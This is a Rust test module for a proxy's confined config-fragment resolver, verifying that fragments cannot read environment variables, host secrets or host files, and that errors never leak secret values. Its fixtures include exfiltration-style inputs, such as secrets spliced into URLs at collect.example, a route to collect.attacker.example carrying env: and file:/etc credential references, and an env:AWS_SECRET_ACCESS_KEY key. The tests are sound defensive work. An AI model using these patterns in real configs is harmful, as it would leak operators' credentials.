fn join_path(parent: &str, child: &str) -> String {
    if parent.is_empty() {
        child.to_string()
    } else {
        format!("{parent}.{child}")
    }
}

/// The document root has no dotted path; name it so an error is not
/// missing its location.
fn shown_path(path: &str) -> String {
    if path.is_empty() {
        "<root>".to_string()
    } else {
        path.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::compiler::{interpolate_env_vars, unresolved_env_references};
    use crate::test_env::EnvVarGuard;

    /// The variable every leak test sets in the test process. If the
    /// confined pass ever reads the environment, this value shows up in
    /// an output or an error and the assertion naming it fails.
    const SECRET_VAR: &str = "SBPROXY_CONFINED_TEST_SECRET";
    /// The value that must never appear anywhere the confined pass
    /// produces.
    const SECRET_VALUE: &str = "sentinel-value-must-not-leak";

    fn secret_env() -> EnvVarGuard {
        EnvVarGuard::set(&[("SBPROXY_CONFINED_TEST_SECRET", Some(SECRET_VALUE))])
    }

    fn bindings(pairs: &[(&str, serde_json::Value)]) -> HashMap<String, serde_json::Value> {
        pairs
            .iter()
            .map(|(k, v)| ((*k).to_string(), v.clone()))
            .collect()
    }

    #[test]
    fn fragment_env_reference_is_refused_without_reading_the_variable() {
        let _env = secret_env();
        let fragment = format!(
            "action:\n  type: proxy\n  url: \"https://collect.example/${{{SECRET_VAR}}}\"\n"
        );
        let error = resolve_confined_fragment("acme/api@sb.yml", &fragment, &bindings(&[]))
            .expect_err("a fragment naming a process variable must be refused");
        match &error {
            ConfinedTemplateError::EnvReference {
                fragment,
                path,
                variable,
                ..
            } => {
                assert_eq!(variable, SECRET_VAR);
                assert_eq!(path, "action.url");
                assert_eq!(fragment, "acme/api@sb.yml");
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        let rendered = error.to_string();
        assert!(rendered.contains(SECRET_VAR), "{rendered}");
        assert!(
            !rendered.contains(SECRET_VALUE),
            "the refusal echoed the variable's value: {rendered}"
        );
    }

    #[test]
    fn fragment_env_reference_with_a_shell_default_is_refused_by_variable_name() {
        let _env = secret_env();
        let fragment = format!("action:\n  url: \"x/${{{SECRET_VAR}:-fallback}}\"\n");
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("a `:-default` form is still an environment read");
        match &error {
            ConfinedTemplateError::EnvReference { variable, .. } => {
                // The variable, not the default: the name is what the
                // fragment author has to stop writing.
                assert_eq!(variable, SECRET_VAR);
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn lua_script_env_reference_is_refused_without_reading_the_variable() {
        let _env = secret_env();
        // The pre-parse text pass reaches a script body, which is the
        // whole reason the post-parse interpolator's skip list is not
        // enough on its own.
        let fragment = format!(
            "transforms:\n  - type: lua\n    lua_script: |\n      local leak = \"${{{SECRET_VAR}}}\"\n      return leak\n"
        );
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("a script body naming a process variable must be refused");
        match &error {
            ConfinedTemplateError::EnvReference { variable, path, .. } => {
                assert_eq!(variable, SECRET_VAR);
                assert_eq!(path, "transforms.0.lua_script");
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(
            !error.to_string().contains(SECRET_VALUE),
            "the refusal echoed the variable's value"
        );
    }

    #[test]
    fn script_bodies_pass_every_other_placeholder_through_verbatim() {
        let _env = secret_env();
        // A script body is opaque: no `{{ }}` substitution even for a
        // bound input, and the documented `$$` escape plus the MCP
        // runtime vocabulary survive byte for byte.
        let body = "local a = \"$${HOME}\"\nlocal b = \"${args.user_id}\"\nlocal c = \"{{vars.rps}}\"\nlocal d = \"{{env.HOME}}\"\nlocal e = {{ 1, 2 }}";
        let fragment = serde_yaml::to_string(&serde_json::json!({
            "transforms": [{ "type": "lua", "lua_script": body }]
        }))
        .expect("fixture serializes");
        let out = resolve_confined_fragment(
            "acme/api",
            &fragment,
            &bindings(&[("rps", serde_json::json!(50))]),
        )
        .expect("a script body with no environment reference resolves");
        let parsed: serde_yaml::Value = serde_yaml::from_str(&out).expect("output parses");
        let round_tripped = parsed["transforms"][0]["lua_script"]
            .as_str()
            .expect("the script body survives as a string");
        assert_eq!(round_tripped, body);
        assert!(!out.contains(SECRET_VALUE));
    }

    #[test]
    fn env_template_form_is_refused_without_reading_the_variable() {
        let _env = secret_env();
        let fragment = format!(
            "request_modifiers:\n  - headers:\n      set:\n        X-Leak: \"{{{{env.{SECRET_VAR}}}}}\"\n"
        );
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("`{{env.X}}` is an environment read too");
        match &error {
            ConfinedTemplateError::EnvTemplate { variable, path, .. } => {
                assert_eq!(variable, SECRET_VAR);
                assert_eq!(path, "request_modifiers.0.headers.set.X-Leak");
            }
            other => panic!("expected an EnvTemplate refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_mapping_key_naming_a_variable_is_refused() {
        let _env = secret_env();
        // The pre-parse pass substitutes inside a KEY as readily as
        // inside a value, so scanning values alone would be a detector
        // narrower than its enforcer.
        let fragment = format!("headers:\n  \"${{{SECRET_VAR}}}\": \"anything\"\n");
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("a mapping key naming a process variable must be refused");
        match &error {
            ConfinedTemplateError::EnvReference { variable, path, .. } => {
                assert_eq!(variable, SECRET_VAR);
                assert!(path.ends_with("(mapping key)"), "{path}");
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_bound_input_resolves_including_a_dotted_path() {
        let fragment = "policies:\n  - type: rate_limiting\n    requests_per_second: \"{{vars.limits.rps}}\"\n    burst: \"{{variables.burst}}\"\n";
        let out = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[
                ("limits", serde_json::json!({ "rps": 25 })),
                ("burst", serde_json::json!("50")),
            ]),
        )
        .expect("bound inputs resolve");
        let parsed: serde_yaml::Value = serde_yaml::from_str(&out).expect("output parses");
        assert_eq!(parsed["policies"][0]["requests_per_second"], "25");
        assert_eq!(parsed["policies"][0]["burst"], "50");
    }

    #[test]
    fn an_unbound_input_is_a_named_error_listing_only_input_names() {
        let fragment = "action:\n  url: \"https://{{vars.upstream}}/v1\"\n";
        let error = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[("token", serde_json::json!("s3cr3t-binding-value"))]),
        )
        .expect_err("an input outside the binding set is an error, not a passthrough");
        match &error {
            ConfinedTemplateError::UnboundInput {
                variable,
                path,
                bound,
                ..
            } => {
                assert_eq!(variable, "upstream");
                assert_eq!(path, "action.url");
                assert_eq!(bound, "token");
            }
            other => panic!("expected an UnboundInput refusal, got {other:?}"),
        }
        assert!(
            !error.to_string().contains("s3cr3t-binding-value"),
            "the refusal listed a binding's value, not just its name"
        );
    }

    #[test]
    fn a_binding_value_cannot_synthesize_an_environment_reference() {
        let _env = secret_env();
        // Scanning the fragment before substitution would miss this:
        // the live `${...}` exists only in the substituted result.
        let fragment = "action:\n  url: \"https://collect.example/{{vars.suffix}}\"\n";
        let error = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[("suffix", serde_json::json!(format!("${{{SECRET_VAR}}}")))]),
        )
        .expect_err("a synthesized environment reference must be refused");
        match &error {
            ConfinedTemplateError::EnvReference { variable, .. } => {
                assert_eq!(variable, SECRET_VAR);
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_binding_value_cannot_synthesize_a_resolvable_template() {
        let _env = secret_env();
        let fragment = "action:\n  url: \"https://collect.example/{{vars.suffix}}\"\n";
        let error = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[(
                "suffix",
                serde_json::json!(format!("{{{{env.{SECRET_VAR}}}}}")),
            )]),
        )
        .expect_err("a synthesized `{{env.X}}` must be refused");
        match &error {
            ConfinedTemplateError::EnvTemplate { variable, .. } => {
                assert_eq!(variable, SECRET_VAR);
            }
            other => panic!("expected an EnvTemplate refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_yaml_tag_in_a_fragment_is_refused_naming_the_fragment() {
        let error = resolve_confined_fragment(
            "acme/api",
            "password: !env ADMIN_PASSWORD\n",
            &bindings(&[]),
        )
        .expect_err("a tag is stripped by the parser and must not reach a value");
        match &error {
            ConfinedTemplateError::YamlTag {
                fragment,
                tag,
                path,
                ..
            } => {
                assert_eq!(fragment, "acme/api");
                assert_eq!(tag, "!env");
                assert_eq!(path, "password");
            }
            other => panic!("expected a YamlTag refusal, got {other:?}"),
        }
    }

    #[test]
    fn a_fragment_may_not_use_a_host_backed_secret_reference() {
        let _env = secret_env();
        // The attack the template scan cannot see. No `${`, no `{{`, and
        // the process resolver reads it straight out of the environment
        // at config load. Same shape as `examples/keys-inbound-headers`.
        for (value, form_name) in [
            (format!("env:{SECRET_VAR}"), "env:NAME"),
            (format!("vault://env/{SECRET_VAR}"), "vault://env/NAME"),
            ("file:/etc/sbproxy/aws-creds".to_string(), "file:PATH"),
            // The same read spelled as a URL. `strip_prefix("file:")`
            // hands the resolver `///etc/...`, which POSIX resolves to
            // `/etc/...`, so a mirror that skipped `file://` would have
            // refused one spelling and passed the other.
            ("file:///etc/sbproxy/aws-creds".to_string(), "file:PATH"),
            // Leading whitespace does not smuggle one past either.
            (format!("  env:{SECRET_VAR}"), "env:NAME"),
        ] {
            let fragment = serde_yaml::to_string(&serde_json::json!({
                "action": { "type": "proxy", "url": "https://collect.attacker.example" },
                "authentication": { "type": "api_key", "api_key": value },
            }))
            .expect("fixture serializes");
            let error = match resolve_confined_fragment("acme/api", &fragment, &bindings(&[])) {
                Ok(resolved) => panic!("`{value}` must be refused, resolved to {resolved}"),
                Err(error) => error,
            };
            match &error {
                ConfinedTemplateError::HostSecretReference {
                    form, path: field, ..
                } => {
                    assert_eq!(*form, form_name);
                    assert_eq!(field, "authentication.api_key");
                }
                other => {
                    panic!("expected a HostSecretReference refusal for `{value}`, got {other:?}")
                }
            }
            assert!(!error.to_string().contains(SECRET_VALUE));
        }
    }

    #[test]
    fn a_host_backed_secret_reference_names_the_form_and_never_the_value() {
        let _env = secret_env();
        let fragment =
            format!("authentication:\n  type: api_key\n  api_key: \"env:{SECRET_VAR}\"\n");
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("`env:NAME` reads the process environment and must be refused");
        match &error {
            ConfinedTemplateError::HostSecretReference {
                fragment,
                path,
                form,
                reads,
            } => {
                assert_eq!(fragment, "acme/api");
                assert_eq!(path, "authentication.api_key");
                assert_eq!(*form, "env:NAME");
                assert_eq!(*reads, "the process environment");
            }
            other => panic!("expected a HostSecretReference refusal, got {other:?}"),
        }
        let rendered = error.to_string();
        assert!(
            !rendered.contains(SECRET_VALUE),
            "the refusal echoed the variable's value: {rendered}"
        );
        // Not even the variable NAME: the author wrote it, and the field
        // path is the pointer they need.
        assert!(!rendered.contains(SECRET_VAR), "{rendered}");
    }

    #[test]
    fn an_operator_declared_backend_reference_still_resolves_in_a_fragment() {
        // The refusal is scoped to references that read this host
        // directly. A backend named under `proxy.secrets` is the
        // operator's own declaration, and a fragment cannot set
        // `proxy.secrets`, so naming one is not a fragment-controlled
        // read.
        for value in [
            "secret://acme/openai",
            "vault://acme-vault/openai",
            "awssm://aws/prod-key",
            "k8ssecret://k8s/ns/name",
        ] {
            let fragment = serde_yaml::to_string(&serde_json::json!({
                "authentication": { "type": "api_key", "api_key": value },
            }))
            .expect("fixture serializes");
            resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
                .unwrap_or_else(|error| panic!("`{value}` must still resolve, got {error}"));
        }
    }

    #[test]
    fn a_fragment_may_not_inline_a_host_file_by_path() {
        for (key, inline) in [
            ("rego_module_path", "rego_module"),
            ("module_path", "module"),
        ] {
            let fragment = serde_yaml::to_string(&serde_json::json!({
                "request_modifiers": [{ key: "/etc/sbproxy/anything.rego" }],
            }))
            .expect("fixture serializes");
            let error = match resolve_confined_fragment("acme/api", &fragment, &bindings(&[])) {
                Ok(resolved) => {
                    panic!("`{key}` names a host path and must be refused, resolved to {resolved}")
                }
                Err(error) => error,
            };
            match &error {
                ConfinedTemplateError::HostFileInlining {
                    path, inline_key, ..
                } => {
                    assert_eq!(path, &format!("request_modifiers.0.{key}"));
                    assert_eq!(*inline_key, inline);
                }
                other => panic!("expected a HostFileInlining refusal, got {other:?}"),
            }
        }
    }

    #[test]
    fn a_complex_mapping_key_naming_a_variable_is_refused() {
        let _env = secret_env();
        // A YAML explicit key whose value is a sequence. The walk used
        // to scan `key.as_str()` only, so this shape went past the key
        // scan entirely and was re-serialized with the placeholder
        // intact for `interpolate_env_vars` to substitute later.
        let fragment = format!("headers:\n  ? [ \"${{{SECRET_VAR}}}\" ]\n  : {{}}\n");
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("a complex mapping key must be scanned like any other text");
        match &error {
            ConfinedTemplateError::EnvReference { variable, path, .. } => {
                assert_eq!(variable, SECRET_VAR);
                assert!(path.contains("mapping key"), "{path}");
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_host_backed_secret_reference_in_a_complex_key_is_refused() {
        let fragment = "routes:\n  ? [ \"env:AWS_SECRET_ACCESS_KEY\" ]\n  : {}\n";
        let error = resolve_confined_fragment("acme/api", fragment, &bindings(&[]))
            .expect_err("a key is text too, and both scans run on it");
        assert!(
            matches!(error, ConfinedTemplateError::HostSecretReference { .. }),
            "{error:?}"
        );
    }

    #[test]
    fn a_remote_document_keeps_env_interpolation_and_loses_the_other_two() {
        let _env = secret_env();
        let policy = ConfinementPolicy::remote_document();
        // `${VAR}` is the documented and only supported way to run one
        // shared document across a fleet, so it survives.
        check_confined_document(
            "acme/runtime-config",
            &format!("proxy:\n  cluster:\n    node_id: \"${{{SECRET_VAR}}}\"\n"),
            &policy,
        )
        .expect("a remote document may still name per-node variables");
        // `{{vars.X}}` is left for the fleet-wide pass, not resolved
        // here and not refused as unbound.
        check_confined_document(
            "acme/runtime-config",
            "origins:\n  api:\n    action:\n      url: \"https://{{vars.upstream}}\"\n",
            &policy,
        )
        .expect("a remote document's variables resolve later, against the origin");
        // The two powers it never had.
        let error = check_confined_document(
            "acme/runtime-config",
            &format!(
                "origins:\n  api:\n    authentication:\n      api_key: \"env:{SECRET_VAR}\"\n"
            ),
            &policy,
        )
        .expect_err("a remote document may not read this node's environment");
        assert!(
            matches!(error, ConfinedTemplateError::HostSecretReference { .. }),
            "{error:?}"
        );
        assert!(!error.to_string().contains(SECRET_VALUE));
        let error = check_confined_document(
            "acme/runtime-config",
            "origins:\n  api:\n    request_modifiers:\n      - rego_module_path: /etc/x.rego\n",
            &policy,
        )
        .expect_err("a remote document may not name a path on this node");
        assert!(
            matches!(error, ConfinedTemplateError::HostFileInlining { .. }),
            "{error:?}"
        );
    }

    #[test]
    fn checking_a_document_never_rewrites_it() {
        // The publish path signs a digest over the payload and the
        // subscriber diffs it, so a check that returned modified text
        // would be a correctness bug rather than a convenience.
        let yaml = "origins:\n  api:\n    action:\n      url: \"https://{{vars.x}}/$${HOME}\"\n";
        let before = yaml.to_string();
        check_confined_document("acme/doc", yaml, &ConfinementPolicy::remote_document())
            .expect("nothing here is refused");
        assert_eq!(yaml, before);
    }

    #[test]
    fn the_confined_refusal_set_is_exactly_what_the_env_pass_would_read() {
        // The detector-vs-enforcer check. For each form, ask the shipped
        // fleet-wide pass whether it reads the environment (its output
        // changes when the variable is set), then require the confined
        // pass to refuse exactly those. A carve-out that drifted wider
        // or narrower than `interpolate_env_vars` fails here.
        let _env = secret_env();
        let forms = [
            format!("${{{SECRET_VAR}}}"),
            format!("${{{SECRET_VAR}:-fallback}}"),
            format!("$${{{SECRET_VAR}}}"),
            format!("${{args.{SECRET_VAR}}}"),
            format!("${{steps.fetch.{SECRET_VAR}}}"),
            "${method}".to_string(),
            // The three forms the two sides used to disagree on, which
            // is the whole point of a biconditional and which the first
            // version of this test did not contain (WOR-2433 review).
            // `${}` lost its closing brace on the enforcer side;
            // `${request.header.X}` and `${attribution.X}` are
            // documented access-log runtime vocabulary that the confined
            // pass refused as process variables.
            "${}".to_string(),
            "${request.header.X-Request-Id}".to_string(),
            "${attribution.team}".to_string(),
            "plain text with no placeholder".to_string(),
        ];
        for form in &forms {
            let enforcer_reads_env = interpolate_env_vars(form) != *form;
            let fragment = serde_yaml::to_string(&serde_json::json!({ "field": form }))
                .expect("fixture serializes");
            let confined_refuses =
                resolve_confined_fragment("acme/api", &fragment, &bindings(&[])).is_err();
            assert_eq!(
                confined_refuses, enforcer_reads_env,
                "confined refusal and env-pass behavior disagree on {form:?}"
            );
        }
    }

    #[test]
    fn operator_authored_config_still_reads_the_environment() {
        // The confined pass is a second door, not a change to the first
        // one. Same text, the fleet-wide pass, still resolves.
        let _env = secret_env();
        let text = format!("url: https://x/${{{SECRET_VAR}}}\n");
        assert_eq!(
            interpolate_env_vars(&text),
            format!("url: https://x/{SECRET_VALUE}\n")
        );
    }

    #[test]
    fn a_confined_fragment_leaves_the_publish_check_nothing_to_report() {
        // `unresolved_env_references` refuses an authority document that
        // still carries a live `${VAR}`. A confined fragment must never
        // trip it, because the confined pass refuses rather than leaving
        // one behind.
        let _env = secret_env();
        let fragment = "action:\n  type: mcp\n  arg: \"${args.user_id}\"\n  escaped: \"$${HOME}\"\n  header: \"{{request.headers.x}}\"\n  rps: \"{{vars.rps}}\"\n";
        let out = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[("rps", serde_json::json!(10))]),
        )
        .expect("nothing here is an environment reference");
        assert!(
            unresolved_env_references(&out).is_empty(),
            "the publish-time check misfired on a confined fragment: {:?}",
            unresolved_env_references(&out)
        );
        assert!(out.contains("${args.user_id}"), "{out}");
        assert!(out.contains("$${HOME}"), "{out}");
        assert!(out.contains("{{request.headers.x}}"), "{out}");
        assert!(out.contains("10"), "{out}");
    }
}
